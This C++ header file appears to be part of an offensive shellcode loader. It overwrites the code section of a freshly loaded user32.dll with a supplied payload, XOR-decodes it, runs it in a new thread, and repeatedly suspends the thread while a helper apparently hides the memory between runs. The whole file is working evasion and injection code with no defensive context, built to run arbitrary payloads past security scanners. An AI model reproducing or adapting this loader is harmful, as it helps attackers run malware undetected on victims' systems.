#pragma once
#include <stdio.h>
#include <Windows.h>
#include <vector>
#include "helperfuncs.h"

BOOL ExecuteWithAMS(std::vector<BYTE> sc) {
	bool initial_sleep = FALSE;
	int sleep_time;
	PIMAGE_DOS_HEADER DOS_head = (PIMAGE_DOS_HEADER)LoadLibraryExA("user32.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
	PIMAGE_NT_HEADERS NT_head = (PIMAGE_NT_HEADERS)(((PBYTE)DOS_head) + DOS_head->e_lfanew);
	PIMAGE_SECTION_HEADER Txt = IMAGE_FIRST_SECTION(NT_head);

	PVOID pTxt = ((PBYTE)DOS_head) + Txt->VirtualAddress;
	DWORD SzTxt = Txt->Misc.VirtualSize;
	
	DWORD oldprot = 0;
	VirtualProtect(pTxt, SzTxt, PAGE_EXECUTE_READWRITE, &oldprot);
	memcpy(pTxt, sc.data(), sc.size());

	PBYTE PBytes = (PBYTE)pTxt;
	for (size_t i = 0; i < SzTxt; i++) {
		PBytes[i] ^= 0xaa;
	}
	HANDLE exec_thread = CreateThread(nullptr, THREAD_ALL_ACCESS, (LPTHREAD_START_ROUTINE)pTxt, nullptr, NULL, nullptr);

	for (;;) {
		if (!initial_sleep) {
			sleep_time = 65;
			initial_sleep = TRUE;
		}
		else
		{
			sleep_time = 13;
		}
		SuspendThread(exec_thread);
		SleepySwitch(sleep_time, pTxt, (size_t)SzTxt);
		ResumeThread(exec_thread);
		WaitForSingleObject(exec_thread, 10000);
	}
	
	return TRUE;
}